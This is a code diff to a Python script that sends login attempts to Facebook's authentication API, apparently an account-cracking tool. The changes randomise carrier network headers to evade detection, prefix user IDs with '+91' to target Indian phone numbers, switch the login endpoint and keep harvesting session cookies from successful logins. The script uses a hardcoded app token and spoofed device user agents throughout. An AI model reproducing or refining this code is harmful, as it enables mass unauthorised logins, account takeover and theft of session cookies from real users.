@@ -1483,8 +1483,8 @@ def p(uid,pwx,tl):
             'Accept': '*/*',
             'Connection': 'keep-alive',
             'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-SIM-HNI': '28255',
-            'X-FB-Net-HNI': '28732',
+            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+            'X-FB-Net-HNI': str(random.randint(20000,40000)),
             'X-FB-Connection-Bandwidth': '27181576',
             'X-FB-Connection-Quality': 'EXCELLENT',
             'X-FB-Connection-Type': 'MOBILE.LTE',
@@ -1547,7 +1547,7 @@ def x(uid,pwx,tl):
             'secure_family_device_id': str(uuid.uuid4()),
             'cpl': 'true',
             'try_num': '1',
-            'email': uid,
+            'email': '+91'+uid,
             'password': pw,
             'method': 'auth.login',
             'generate_session_cookies': '1',
@@ -1568,8 +1568,8 @@ def x(uid,pwx,tl):
             'Accept-Encoding': 'gzip, deflate',
             'Connection': 'keep-alive',
             'Priority': 'u=3, i',
-            'X-Fb-Sim-Hni': '45204',
-            'X-Fb-Net-Hni': '45201',
+            'X-Fb-Sim-Hni': str(random.randint(20000,40000)),
+            'X-Fb-Net-Hni': str(random.randint(20000,40000)),
             'X-Fb-Connection-Quality': 'GOOD',
             'Zero-Rated': '0',
             'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]",
@@ -1584,9 +1584,8 @@ def x(uid,pwx,tl):
             'X-Fb-Client-Ip': 'True',
             'X-Fb-Server-Cluster': 'True',
             'Content-Length': '847'}
-            url = "https://b-api.facebook.com/auth/login"
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
-            print(result)
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
